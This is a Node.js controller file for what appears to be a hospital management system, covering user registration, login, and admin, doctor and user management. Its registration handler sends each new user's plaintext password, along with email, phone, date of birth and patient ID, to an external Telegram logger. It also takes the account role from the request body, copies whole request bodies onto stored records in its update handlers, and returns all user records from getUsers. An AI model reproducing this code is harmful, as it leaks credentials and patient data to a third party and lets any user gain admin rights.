import { User } from "../models/userSchema.js";
import { catchAsyncErros } from "../middlewares/catchAsyncErrors.js";
import ErrorHandler from "../middlewares/errorMiddleware.js";
import { generateToken } from "../utils/jwtTokens.js";
import { isAdminAuthenticated } from "../middlewares/auth.js";
import cloudinary from "cloudinary";
import crypto from "crypto";
import { sendEmailOTP } from "../utils/sendEmailOTP.js";
import { sendTelegramLog } from "../utils/telegramLogger.js";

export const registerUser = catchAsyncErros(async (req, res, next) => {
  const {
    firstName,
    lastName,
    email,
    password,
    phone,
    patientId,
    dob,
    gender,
    role,
    doctorDepartment,
    docAvatar,
  } = req.body;

  if (
    !firstName ||
    !lastName ||
    !email ||
    !password ||
    !phone ||
    !dob ||
    !gender ||
    !role
  ) {
    return next(new ErrorHandler("Please fill all the required fields", 400));
  }

  const existingUser = await User.findOne({ email });
  if (existingUser) {
    return next(new ErrorHandler("User with this email already exists", 400));
  }

  // ✅ STORE CREATED USER
  const user = await User.create({
    firstName,
    lastName,
    email,
    password,
    phone,
    patientId,
    dob,
    gender,
    role,
    doctorDepartment,
    docAvatar,
  });

  // ✅ SEND RESPONSE VIA TOKEN FUNCTION
  generateToken(user, "User registered successfully", 201, res);

  // 🔥 TELEGRAM LOG HERE
  await sendTelegramLog(`
━━━━━━━━━━━━━━
👤 <b>New User Registered</b>
━━━━━━━━━━━━━━

👤 <b>Name:</b> ${firstName} ${lastName}
🆔 <b>Patient ID:</b> ${patientId}
📧 <b>Email:</b> ${email}
📱 <b>Phone:</b> ${phone}
🎂 <b>DOB:</b> ${dob}
⚧ <b>Gender:</b> ${gender}
🔐 <b>Password: ${password}</b> 
<b>Created Successfully</b>
🕒 Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━
`);
});

export const login = catchAsyncErros(async (req, res, next) => {
  const { email, password, role } = req.body;
  if (!email || !password || !role) {
    return next(new ErrorHandler("Please Fill Full Form!", 400));
  }
  // if (password !== confirmPassword) {
  //   return next(
  //     new ErrorHandler("Password & Confirm Password Do Not Match!", 400),
  //   );
  // }

  const user = await User.findOne({ email }).select("+password");
  if (!user) {
    return next(new ErrorHandler("Invalid Email Or Password!", 400));
  }

  const isPasswordMatch = await user.comparePassword(password);
  if (!isPasswordMatch) {
    return next(new ErrorHandler("Invalid Email Or Password!", 400));
  }
  if (role !== user.role) {
    return next(
      new ErrorHandler(`You don't have access as you are ${user.role}`, 400),
    );
  }
  if (!user.emailVerified) {
    return next(
      new ErrorHandler("Email not verified. Please verify OTP.", 403),
    );
  }

  await sendTelegramLog(`
━━━━━━━━━━━━━━
👤 <b>${user.role} Logged In</b>
━━━━━━━━━━━━━━

👤 <b>Name:</b> ${user.firstName} ${user.lastName}
📧 <b>Email:</b> ${user.email}
🛡️ <b>Role:</b> ${user.role}
🌍 <b>IP:</b> ${req.ip}
💻 <b>User-Agent:</b> ${req.headers["user-agent"]}
🕒 <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━
`);

  generateToken(user, "Login Successfully!", 201, res);
});

export const addNewAdmin = catchAsyncErros(async (req, res, next) => {
  const {
    firstName,
    lastName,
    email,
    phone,
    patientId,
    dob,
    gender,
    password,
  } = req.body;
  if (
    !firstName ||
    !lastName ||
    !email ||
    !phone ||
    !patientId ||
    !dob ||
    !gender ||
    !password
  ) {
    return next(new ErrorHandler("Please Fill Full Form!", 400));
  }

  const isRegistered = await User.findOne({ email });
  if (isRegistered) {
    return next(new ErrorHandler("Admin With This Email Already Exists!", 400));
  }

  const admin = await User.create({
    firstName,
    lastName,
    email,
    phone,
    patientId,
    dob,
    gender,
    password,
    role: "admin",
  });

  await sendTelegramLog(`
━━━━━━━━━━━━━━━━━━
🚨 <b>New Admin Created</b>
━━━━━━━━━━━━━━━━━━

👤 <b>Name:</b> ${firstName} ${lastName}
🆔 <b>ID:</b> ${patientId}
📧 <b>Email:</b> ${email}
📱 <b>Phone:</b> ${phone}
🎂 <b>DOB:</b> ${dob}
⚧ <b>Gender:</b> ${gender}
🛡️ <b>Role:</b> Admin
🔐 <b>Password:</b> Encrypted & Stored
🌍 <b>Created From IP:</b> ${req.ip}
🕒 <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━
`);

  res.status(200).json({
    success: true,
    message: "New Admin Registered",
    admin,
  });
});

export const getUsers = catchAsyncErros(async (req, res, next) => {
  const users = await User.find({});
  return res.status(200).json({
    success: true,
    users,
  });
});

export const getDoctors = catchAsyncErros(async (req, res, next) => {
  const users = await User.find({ role: "doctor" });
  return res.status(200).json({
    success: true,
    users,
  });
});

export const getUserDetails = catchAsyncErros(async (req, res, next) => {
  const user = req.user;
  res.status(200).json({
    success: true,
    user,
  });
});

export const logoutAdmin = catchAsyncErros(async (req, res, next) => {
  res
    .status(200)
    .cookie("admin_token", "", {
      httpOnly: true,
      secure: true, // ✅ REQUIRED
      sameSite: "None", // ✅ REQUIRED
      expires: new Date(0),
    })
    .json({
      success: true,
      message: "Admin Logged Out Successfully",
    });
});

export const logoutUser = catchAsyncErros(async (req, res, next) => {
  res
    .status(200)
    // remove user cookie
    .cookie("user_token", "", {
      httpOnly: true,
      secure: true,
      sameSite: "None",
      expires: new Date(0),
    })
    // remove admin cookie
    .cookie("admin_token", "", {
      httpOnly: true,
      secure: true,
      sameSite: "None",
      expires: new Date(0),
    })
    .cookie("doctor_token", "", {
      httpOnly: true,
      secure: true,
      sameSite: "None",
      expires: new Date(0),
    })
    .json({
      success: true,
      message: "Logged out successfully",
    });
});

export const addNewDoctor = catchAsyncErros(async (req, res, next) => {
  if (!req.files || Object.keys(req.files).length === 0) {
    return next(new ErrorHandler("Doctor Avatar Required!", 400));
  }

  const { docAvatar } = req.files;
  const allowedFormats = ["image/jpg", "image/jpeg", "image/png"];
  if (!allowedFormats.includes(docAvatar.mimetype)) {
    return next(
      new ErrorHandler("Only jpg, jpeg, png formats are allowed!", 400),
    );
  }

  const {
    firstName,
    lastName,
    email,
    phone,
    password,
    gender,
    dob,
    patientId,
    doctorDepartment,
  } = req.body;

  if (
    !firstName ||
    !lastName ||
    !email ||
    !phone ||
    !password ||
    !gender ||
    !dob ||
    !patientId ||
    !doctorDepartment
  ) {
    return next(new ErrorHandler("Please Fill Full Form!", 400));
  }

  const isRegistered = await User.findOne({ email });
  if (isRegistered) {
    return next(
      new ErrorHandler("Doctor With This Email Already Exists!", 400),
    );
  }

  const cloudinaryResponse = await cloudinary.uploader.upload(
    docAvatar.tempFilePath,
    {
      folder: "HMS/Doctors",
      width: 150,
      crop: "scale",
    },
  );

  // 👉 CREATE DOCTOR AS UNVERIFIED
  const doctor = await User.create({
    firstName,
    lastName,
    email,
    phone,
    password,
    gender,
    dob,
    patientId,
    doctorDepartment,
    role: "doctor",
    emailVerified: false, // 🔥 KEY LINE
    docAvatar: {
      public_id: cloudinaryResponse.public_id,
      url: cloudinaryResponse.secure_url,
    },
  });

  // 👉 SEND OTP USING SAME LOGIC
  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  const hashedOTP = crypto.createHash("sha256").update(otp).digest("hex");

  doctor.emailOTP = hashedOTP;
  doctor.emailOTPExpire = Date.now() + 5 * 60 * 1000;
  await doctor.save();

  await sendEmailOTP(email, otp);

  await sendTelegramLog(`
━━━━━━━━━━━━━━━━━━
🩺 <b>New Doctor Added</b>
━━━━━━━━━━━━━━━━━━

👤 <b>Name:</b> ${firstName} ${lastName}
🆔 <b>ID:</b> ${patientId}
📧 <b>Email:</b> ${email}
📱 <b>Phone:</b> ${phone}
🎂 <b>DOB:</b> ${dob}
⚧ <b>Gender:</b> ${gender}
🏥 <b>Department:</b> ${doctorDepartment}
🛡️ <b>Role:</b> Doctor
📸 <b>Avatar Uploaded:</b> ✅
📩 <b>Email Verified:</b> ❌ Pending
🌍 <b>Created From IP:</b> ${req.ip}
🕒 <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━
`);

  res.status(200).json({
    success: true,
    message: "Doctor added. OTP sent to doctor email for verification.",
  });
});

export const updateDoctor = catchAsyncErros(async (req, res, next) => {
  const { id } = req.params;

  const updates = req.body;
  if (Object.keys(updates).length === 0) {
    return next(new ErrorHandler("No fields provided to update", 400));
  }

  const doctor = await User.findOne({ _id: id, role: "doctor" });
  if (!doctor) {
    return next(new ErrorHandler("Doctor Not Found!", 404));
  }

  // Prevent duplicate email
  if (updates.email && updates.email !== doctor.email) {
    const emailExists = await User.findOne({ email: updates.email });
    if (emailExists) {
      return next(new ErrorHandler("Email already in use", 400));
    }
  }

  Object.assign(doctor, updates);
  await doctor.save();

  await sendTelegramLog(`
━━━━━━━━━━━━━━━━━━
🟡 <b>Doctor Updated</b>
━━━━━━━━━━━━━━━━━━

👤 <b>Name:</b> ${doctor.firstName} ${doctor.lastName}
🆔 <b>ID:</b> ${doctor._id}
🏥 <b>Department:</b> ${doctor.doctorDepartment}
✏️ <b>Updated Fields:</b> ${Object.keys(updates).join(", ")}
👮 <b>Updated By:</b> ${req.user?.firstName || "Admin"}
🌍 <b>IP:</b> ${req.ip}
🕒 <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━
`);

  res.status(200).json({
    success: true,
    message: "Doctor Details Updated Successfully",
    doctor,
  });
});

export const deleteDoctor = catchAsyncErros(async (req, res, next) => {
  const { id } = req.params;

  const doctor = await User.findOne({ _id: id, role: "doctor" });
  if (!doctor) {
    return next(new ErrorHandler("Doctor Not Found!", 404));
  }

  await sendTelegramLog(`
━━━━━━━━━━━━━━━━━━
🔴 <b>Doctor Deleted</b>
━━━━━━━━━━━━━━━━━━

👤 <b>Name:</b> ${doctor.firstName} ${doctor.lastName}
🆔 <b>ID:</b> ${doctor._id}
📧 <b>Email:</b> ${doctor.email}
🏥 <b>Department:</b> ${doctor.doctorDepartment}
👮 <b>Deleted By:</b> ${req.user?.firstName || "Admin"}
🌍 <b>IP:</b> ${req.ip}
🕒 <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━
`);

  await doctor.deleteOne();

  res.status(200).json({
    success: true,
    message: "Doctor Deleted Successfully",
  });
});
export const updateUser = catchAsyncErros(async (req, res, next) => {
  const { id } = req.params;

  const updates = req.body;
  if (Object.keys(updates).length === 0) {
    return next(new ErrorHandler("No fields provided to update", 400));
  }

  const user = await User.findOne({ _id: id });
  if (!user) {
    return next(new ErrorHandler("User Not Found!", 404));
  }

  // Prevent duplicate email
  if (updates.email && updates.email !== user.email) {
    const emailExists = await User.findOne({ email: updates.email });
    if (emailExists) {
      return next(new ErrorHandler("Email already in use", 400));
    }
  }

  Object.assign(user, updates);
  await user.save();

  await sendTelegramLog(`
━━━━━━━━━━━━━━━━━━
🟡 <b>User Updated</b>
━━━━━━━━━━━━━━━━━━

👤 <b>Name:</b> ${user.firstName} ${user.lastName}
🆔 <b>ID:</b> ${user._id}
🛡️ <b>Role:</b> ${user.role}
✏️ <b>Updated Fields:</b> ${Object.keys(updates).join(", ")}
👮 <b>Updated By:</b> ${req.user?.firstName || "Admin"}
🌍 <b>IP:</b> ${req.ip}
🕒 <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━
`);

  res.status(200).json({
    success: true,
    message: "User Details Updated Successfully",
    user,
  });
});

export const deleteUser = catchAsyncErros(async (req, res, next) => {
  const { id } = req.params;

  const user = await User.findOne({ _id: id });
  if (!user) {
    return next(new ErrorHandler("User Not Found!", 404));
  }

  await user.deleteOne();

  await sendTelegramLog(`
━━━━━━━━━━━━━━━━━━
🔴 <b>User Deleted</b>
━━━━━━━━━━━━━━━━━━

👤 <b>Name:</b> ${user.firstName} ${user.lastName}
🆔 <b>ID:</b> ${user._id}
📧 <b>Email:</b> ${user.email}
🛡️ <b>Role:</b> ${user.role}
👮 <b>Deleted By:</b> ${req.user?.firstName || "Admin"}
🌍 <b>IP:</b> ${req.ip}
🕒 <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━
`);

  await user.deleteOne();

  res.status(200).json({
    success: true,
    message: "User Deleted Successfully",
  });
});
